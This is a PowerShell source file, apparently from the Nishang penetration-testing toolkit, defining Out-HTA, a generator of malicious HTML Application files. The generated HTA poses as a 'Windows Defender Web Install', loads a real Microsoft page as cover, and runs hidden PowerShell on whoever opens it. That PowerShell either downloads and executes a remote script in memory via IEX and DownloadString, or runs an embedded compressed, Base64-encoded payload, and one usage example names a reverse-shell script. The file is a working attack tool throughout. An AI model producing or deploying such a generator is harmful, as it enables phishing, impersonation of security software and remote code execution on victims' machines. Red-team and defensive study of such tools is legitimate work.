
function Out-HTA
{
<#
.SYNOPSIS
Nishang script which could be used for generating "infected" HTML Application. It could be deployed on 
a web server and PowerShell scripts and commands could be executed on the target machine.

.DESCRIPTION
The script generates a HTA file with inline VBScript. The HTA should be deployed on a web server.
When a target browses to the HTA file and chooses to run it, PowerShell commands and scripts in it are executed.

The HTA is not visible as it is closed quickly. But in case, if the HTA becomes visible (for example in case of an error), it loads 
a live page related to Windows Defender from Microsoft website to look legit.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER PayloadScript
Path to the PowerShell script to be encoded in the HTA which would be executed on the target.

.PARAMETER Arguments
Arguments to the PowerShell script to be executed on the target.

.PARAMETER HTAFilePath
Path to the HTA file to be generated. Default is with the name WindDef_WebInstall.hta in the current directory.

.EXAMPLE
PS > Out-HTA -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-ChildItem"

Above command would execute Get-ChildItem on the target machine when the HTA is opened.

.EXAMPLE
PS > Out-HTA -PayloadURL http://192.168.254.1/Get-Information.ps1

Use above command to generate HTA and VBS files which download and execute the given powershell script in memory on target.

.EXAMPLE
PS > Out-HTA -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM

Use above command to pass an argument to the PowerShell script/module.

.EXAMPLE
PS > Out-HTA -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1

Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
you must pass the parameters in the script itself.

.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
#>


    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $PayloadScript,
        
        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $Arguments,


        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $HTAFilePath="$pwd\WindDef_WebInstall.hta"


    )
    
    if(!$Payload)
    {
        $Payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }
   
    
    if($PayloadScript)
    {
        #Logic to read, compress and Base64 encode the payload script.
        $Enc = Get-Content $PayloadScript -Encoding Ascii
    
        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $Enc | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()
    
        # Base64 encode stream
        $Compressed = [Convert]::ToBase64String($ms.ToArray())
    
        $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +

        "`$(New-Object IO.Compression.DeflateStream (" +

        "`$(New-Object IO.MemoryStream (,"+

        "`$([Convert]::FromBase64String('$Compressed')))), " +

        "[IO.Compression.CompressionMode]::Decompress)),"+

        " [Text.Encoding]::ASCII)).ReadToEnd();"

        #Generate Base64 encoded command to use with the powershell -encodedcommand paramter"
        $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
        $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
        $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"  
    }

    $HTA = @"
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
    <title>Windows Defender Web Install</title>

    <script language="VBScript">
    set oShell = CreateObject("Wscript.Shell")
    oShell.Run("$Payload"),0,true
    self.close()
    </script>
    <hta:application
       id="oHTA"
       applicationname="Windows Defender Web Install"
       application="yes"
    >
    </hta:application>
    </head>
    <div> 
    <object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%">
    </object></div>   
    <body>
    </body>
    </html>
"@

    Out-File -InputObject $HTA -FilePath $HTAFilepath
    Write-Output "HTA written to $HTAFilepath."
}


